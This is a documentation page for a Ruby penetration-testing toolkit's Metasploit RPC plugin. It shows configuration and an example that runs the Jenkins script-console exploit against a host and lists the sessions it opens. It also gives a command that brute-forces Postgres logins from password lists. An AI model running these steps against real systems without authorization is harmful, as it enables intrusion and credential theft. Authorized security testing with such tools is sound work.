# `PWN::Plugins::Metasploit`

RPC client for `msfrpcd` — search modules, set options, run exploits, interact
with sessions, all from Ruby.

> **Install:** `pwn setup --profile exploit` — metasploit-framework ·
> sqlmap. See [Installation](Installation.md).

## Configure

```yaml
# ~/.pwn/pwn.yaml  (edit via `pwn-vault`)
metasploit:
  host: 127.0.0.1
  port: 55553
  user: msf
  pass: …
```

Start the daemon: `msfrpcd -U msf -P … -a 127.0.0.1 -p 55553 -S`

## Use

```ruby
msf = PWN::Plugins::Metasploit.connect
mods = PWN::Plugins::Metasploit.search(msf_obj: msf, query: 'jenkins')
PWN::Plugins::Metasploit.use(msf_obj: msf,
  module_type: 'exploit',
  module_name: 'multi/http/jenkins_script_console')
PWN::Plugins::Metasploit.set_option(msf_obj: msf, opt: 'RHOSTS', val: '10.0.0.5')
job = PWN::Plugins::Metasploit.run(msf_obj: msf)
PWN::Plugins::Metasploit.sessions(msf_obj: msf)
```

CLI: `pwn_msf_postgres_login -H 10.0.0.5 -U users.txt -P pass.txt`

[← Home](Home.md) · [Plugins](Plugins.md)
